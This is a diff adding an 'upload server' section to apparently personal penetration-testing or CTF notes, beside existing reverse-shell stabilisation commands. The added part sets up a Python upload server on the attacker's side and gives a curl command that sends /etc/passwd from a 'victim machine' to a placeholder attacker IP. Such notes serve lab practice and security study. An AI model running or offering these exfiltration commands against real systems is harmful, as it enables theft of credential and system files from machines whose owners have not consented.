@@ -37,3 +37,15 @@ export TERM=xterm
 CTRL+Z
 stty raw -echo;fg
 ```
+
+* upload server
+
+```shellscript
+uv venv
+source .venv/bin/activate
+uv pip install uploadserver
+uv run -m uploadserver
+
+#uploading files from victim machine to the attacker machine
+curl -X POST http://10.10.X.X:8000/upload -F 'files=@/etc/passwd'
+```
